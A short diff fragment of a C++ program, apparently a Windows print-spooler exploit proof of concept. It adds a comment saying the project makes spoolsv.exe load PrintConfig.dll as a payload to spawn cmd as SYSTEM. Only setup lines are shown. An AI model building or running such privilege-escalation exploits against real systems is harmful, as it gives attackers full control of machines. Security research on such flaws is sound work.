@@ -4,6 +4,10 @@
 #pragma comment(lib, "xpsprint.lib")
 #pragma warning(disable : 4995)
 
+/*
+* Project's purpose:
+* Trigger the load of PrintConfig.dll (our payload) in spoolsv.exe to spawn cmd as SYSTEM
+*/
 int main()
 {
 	HANDLE hComplete = CreateEventW(nullptr, TRUE, FALSE, nullptr);
